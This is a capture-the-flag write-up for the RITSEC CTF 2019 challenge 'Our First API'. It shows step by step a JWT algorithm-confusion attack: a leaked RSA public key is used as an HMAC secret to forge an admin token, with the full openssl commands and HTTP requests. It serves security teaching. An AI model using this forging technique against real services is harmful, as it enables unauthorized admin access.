# RITSEC CTF 2019 – Our First API

* **Category:** web
* **Points:** 417

## Challenge

> ctfchallenges.ritsec.club:3000 ctfchallenges.ritsec.club:4000
>
> Hint: You don't need the Bearer keyword!
> 
> Author: sandw1ch

## Solution

Connecting to [http://ctfchallenges.ritsec.club:3000/](http://ctfchallenges.ritsec.club:3000/) will give the following message.

```
This page is only for authentication with our api, located at port 4000!
```

Connecting to [http://ctfchallenges.ritsec.club:4000/](http://ctfchallenges.ritsec.club:4000/) will give the following message.

```
API Documentation

Below are some of the api endpoints that you can use. Please use them responsibly :)!
Use the format below to make your requests to the API.

Nodes 	Description
/api/admin 	

    For admin users to authenticate. Please provide us your authorization token given to you by the /auth endpoint. 

/api/normal 	

    For standard users to authenticate. Please provide us your authorization token given to you by the /auth endpoint. 

/auth 	

    Authentication endpoint on port 3000. Please send your name and this api will return your token for accessing the api! 
```

At this point you have references to an exposed API. Trying to connect to [http://ctfchallenges.ritsec.club:4000/api/normal](http://ctfchallenges.ritsec.club:4000/api/normal) will result in an error.

```
Forbidden, missing JWT authorization
```

So you can request a JWT using the `/auth` API and specifying a `name`.

```
GET http://ctfchallenges.ritsec.club:3000/auth?name=m3ssap0 HTTP/1.1
Accept-Encoding: gzip,deflate
Host: ctfchallenges.ritsec.club:3000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 16 Nov 2019 09:49:38 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 287
Connection: keep-alive
X-Powered-By: Express
ETag: W/"11f-JMdC/jocpabmtyWtX3112GAnmeM"

{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJ1c2VyIiwiaWF0IjoxNTczODk3Nzc4fQ.gZQldIgqszPZdD8eBxAsdCH6b8JJKp-Muem2sWX_8sFw8Wcqdt2GBhI6Uhu55RQx9Jv1EQykus7SRb9IIWiFHeVYuGGM5MZP2U3eTDOSscXZoMR6hVSOKHtDFsBVvvzob9-ZKjuOnziXCiOZHQPs2Bjfx-YThBhWZ8VyAMV2kUQ"}
```

You can decode the token to understand its format.

```
{"typ":"JWT","alg":"RS256"}
{"name":"m3ssap0","type":"user","iat":1573897778}
gZQldIgqszPZdD8eBxAsdCH6b8JJKp-Muem2sWX_8sFw8Wcqdt2GBhI6Uhu55RQx9Jv1EQykus7SRb9IIWiFHeVYuGGM5MZP2U3eTDOSscXZoMR6hVSOKHtDFsBVvvzob9-ZKjuOnziXCiOZHQPs2Bjfx-YThBhWZ8VyAMV2kUQ
```

As you can see, you have low privileges (i.e. `user`), but you can use this token to be authenticated.

```
GET http://ctfchallenges.ritsec.club:4000/api/normal HTTP/1.1
Accept-Encoding: gzip,deflate
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJ1c2VyIiwiaWF0IjoxNTczODk3Nzc4fQ.gZQldIgqszPZdD8eBxAsdCH6b8JJKp-Muem2sWX_8sFw8Wcqdt2GBhI6Uhu55RQx9Jv1EQykus7SRb9IIWiFHeVYuGGM5MZP2U3eTDOSscXZoMR6hVSOKHtDFsBVvvzob9-ZKjuOnziXCiOZHQPs2Bjfx-YThBhWZ8VyAMV2kUQ
Host: ctfchallenges.ritsec.club:4000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 16 Nov 2019 09:52:38 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 79
Connection: keep-alive
X-Powered-By: Express
ETag: W/"4f-u9uH9/VkEWCKoW8TLnG/KetS8Ks"

{"flag":"Congrats on authenticating! Too bad flags aren't for normal users !!"}
```

The authentication works, but the correct endpoint to call is `/admin`.

```
GET http://ctfchallenges.ritsec.club:4000/api/admin HTTP/1.1
Accept-Encoding: gzip,deflate
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJ1c2VyIiwiaWF0IjoxNTczODk3Nzc4fQ.gZQldIgqszPZdD8eBxAsdCH6b8JJKp-Muem2sWX_8sFw8Wcqdt2GBhI6Uhu55RQx9Jv1EQykus7SRb9IIWiFHeVYuGGM5MZP2U3eTDOSscXZoMR6hVSOKHtDFsBVvvzob9-ZKjuOnziXCiOZHQPs2Bjfx-YThBhWZ8VyAMV2kUQ
Host: ctfchallenges.ritsec.club:4000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)

HTTP/1.1 403 Forbidden
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 16 Nov 2019 10:04:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 26
Connection: keep-alive
X-Powered-By: Express
ETag: W/"1a-0ieoISNU3KaboLL5dBc9VysAH3I"

{"reason":"Not an admin!"}
```

Unfortunately, you don't have enough privileges. Furthermore, trying to alter the JWT changing the `alg` to `none`, changing the `type` to `admin` and removing the signature will not work.

Analyzing the HTML source of the API documentation page, you can discover an interesting comment.

```
<!-- Robots can help you with the api -->
```

So you can discover: [http://ctfchallenges.ritsec.club:3000/robots.txt](http://ctfchallenges.ritsec.club:3000/robots.txt).

```
User-agent: * Disallow: /signing.pem Disallow: /auth
```

And you can get the signing certificate [signing.pem](signing.pem) that can be used to craft a malicious JWT.

```
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDBquzMGkZlJmZm4pYppxeDmsGd
8+9mOh5S9O7W7Gu5VByfl7i3JdCfGxRJdHscg6l321PeTXsXGZ7goHd4Xjv/FtKQ
DyoaKql4Kl692KKKN/9xA6tKdOYQbZvPqyRXUVOGdyZ12qFBOQzI7ox22YL3ul/3
nyiDR+p+JKbdVU6AWQIDAQAB
-----END PUBLIC KEY-----
```

The first part of the JWT is the following.

```
{"typ":"JWT","alg":"HS256"}
{"name":"m3ssap0","type":"admin","iat":1573897778}

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJhZG1pbiIsImlhdCI6MTU3Mzg5Nzc3OH0
```

The signature can be performed with following operations.

```
root@m3ss4p0:~# openssl x509 -in signing.pem -pubkey -noout > public_key.pem

root@m3ss4p0:~# cat signing.pem | xxd -p | tr -d "\\n"
2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d4947664d413047435371475349623344514542415155414134474e4144434269514b426751444271757a4d476b5a6c4a6d5a6d34705970707865446d7347640a382b396d4f683553394f375737477535564279666c3769334a6443664778524a6448736367366c333231506554587358475a37676f486434586a762f46744b510a44796f614b716c344b6c3639324b4b4b4e2f39784136744b644f5951625a76507179525855564f4764795a31327146424f517a49376f783232594c33756c2f330a6e796944522b702b4a4b62645655364157514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a

root@m3ss4p0:~# echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJhZG1pbiIsImlhdCI6MTU3Mzg5Nzc3OH0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d4947664d413047435371475349623344514542415155414134474e4144434269514b426751444271757a4d476b5a6c4a6d5a6d34705970707865446d7347640a382b396d4f683553394f375737477535564279666c3769334a6443664778524a6448736367366c333231506554587358475a37676f486434586a762f46744b510a44796f614b716c344b6c3639324b4b4b4e2f39784136744b644f5951625a76507179525855564f4764795a31327146424f517a49376f783232594c33756c2f330a6e796944522b702b4a4b62645655364157514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
(stdin)= 59d895e8e3aa3570f35f5894ab58349e5ed4510bbff976cb4c1315e2d41b6e81

root@m3ss4p0:~# python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('59d895e8e3aa3570f35f5894ab58349e5ed4510bbff976cb4c1315e2d41b6e81')).replace('=','')\")"
WdiV6OOqNXDzX1iUq1g0nl7UUQu_-XbLTBMV4tQbboE
```

So the final JWT is the following.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJhZG1pbiIsImlhdCI6MTU3Mzg5Nzc3OH0.WdiV6OOqNXDzX1iUq1g0nl7UUQu_-XbLTBMV4tQbboE
```

Now the right API endpoint can be called.

```
GET http://ctfchallenges.ritsec.club:4000/api/admin HTTP/1.1
Accept-Encoding: gzip,deflate
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJhZG1pbiIsImlhdCI6MTU3Mzg5Nzc3OH0.WdiV6OOqNXDzX1iUq1g0nl7UUQu_-XbLTBMV4tQbboE
Host: ctfchallenges.ritsec.club:4000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 16 Nov 2019 11:01:12 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 36
Connection: keep-alive
X-Powered-By: Express
ETag: W/"24-vlpXTZ6UFXtGl+K+y0F+DaKpibw"

{"flag":"RITSEC{JWT_th1s_0ne_d0wn}"}
```

The flag is the following.
```
RITSEC{JWT_th1s_0ne_d0wn}
```